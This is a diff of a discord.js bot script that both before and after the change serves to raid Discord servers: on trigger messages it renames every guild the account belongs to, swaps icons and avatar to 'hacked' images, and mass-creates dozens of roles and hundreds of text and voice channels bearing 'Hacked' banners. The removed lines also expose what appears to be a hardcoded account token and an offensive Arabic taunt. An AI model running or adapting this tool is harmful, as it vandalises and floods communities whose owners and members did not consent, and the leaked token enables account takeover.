@@ -1,936 +1,426 @@
 const Discord = require("discord.js");
-const hngel = new Discord.Client();
-console.log('Hacked Bواحد غريب GN Is here,');
-hngel.on('ready', () => {
-  console.log(`Logged in as ${hngel.user.tag} !`);
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
 
 });
-hngel.on('ready',  () => {
-    console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-    console.log('  start = g ');
-    console.log('  start = gg');
-    console.log('  start = g1');
-    console.log('  start = .');
-    console.log('  start = -');
-    console.log('  start = ..');
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ " hngel " ] servers! [ " ${hngel.guilds.size} " ] Users! [ " ${hngel.users.size} " ]`);
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
-const tokn = ("NDY3MjE3OTMwNzE1NzkxMzcx.DjSU9g.6oOHdxymQCywWcILjUfNoR3WAcs") /// توكن حسابك مهم <
-//////////////////////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-
-
+        
     
 
 });
+
+
 var prefix = "-"
-hngel.on("message", message => {
+LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
   var argresult = args.join(' ');
-  if (message.content.startsWith('gn15')) {
-    hngel.user.setUsername(argresult);
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
   }
     if (message.content.startsWith(prefix + 'on123')) {
-    hngel.user.setStatus(argresult);
+    LOka.user.setStatus(argresult);
   }
 });
 
-var x1 = "gg"
-hngel.on('message', message => {
+var x1 = "kk"
+LOka.on('message', message => {
      if (message.content === ".") {
-hngel.user.setAvatar(`https://media.discordapp.net/attachments/418125853931864064/418366728657960960/HackerHacker.png`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/472444395459706882/514082257347018753/b25957472eb5c490.png`)
 
 }
 });
-var x1 = "gg"
-hngel.on('message', message => {
+var x1 = "kk"
+LOka.on('message', message => {
      if (message.content === ".") {
-hngel.user.setUsername("Hacked  to the server 🧤💤")
+LOka.user.setUsername("Hacked u by unknown Is here")
 
 }
 });
-hngel.on('message', message => {
+LOka.on('message', message => {
      if (message.content === ".") {
-hngel.user.setGame(`تم الاغتصاب من قبل 3 قوي`,'https://www.twitch.tv/hngel2667')
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
 }
 });
 
-hngel.on('message', message => {
+LOka.on('message', message => {
      if (message.content === ".") {
-         hngel.guilds.forEach(m =>{
-             m.setIcon(`https://media.discordapp.net/attachments/418125853931864064/418366728657960960/HackerHacker.png`)
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 })
 }
 });
-hngel.on('message', message => {
+LOka.on('message', message => {
      if (message.content === ".") {
-         hngel.guilds.forEach(m =>{
-             m.setName(`تم الاغتصاب من قبل 3 قوي`)
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
 
-hngel.on('message', message => {
+LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
 
-             message.guild.setIcon(`https://media.discordapp.net/attachments/418125853931864064/418366728657960960/HackerHacker.png`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
 }
 });
 
-hngel.on('message', message => {
+LOka.on('message', message => {
      
 
-     if (message.content === "g1") {
-         hngel.guilds.forEach(m =>{
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
   m.createRole({
-        name : " تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
-        permissions :   [1],
-        color : " #ff0000"
-    })   
-     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " , تم الاغتصاب من قبل 3 قوي",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
 }
 });
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
 
-hngel.on('message', message => {
-         if (message.content === "g") {
-               hngel.guilds.forEach(m =>{
-m.createChannel('', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
-m.createChannel('Hacked By GN Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
 
+m.createChannel('Hacked u by unknown Is here', 'text');
 
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
 
 })
 }
 });
 
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
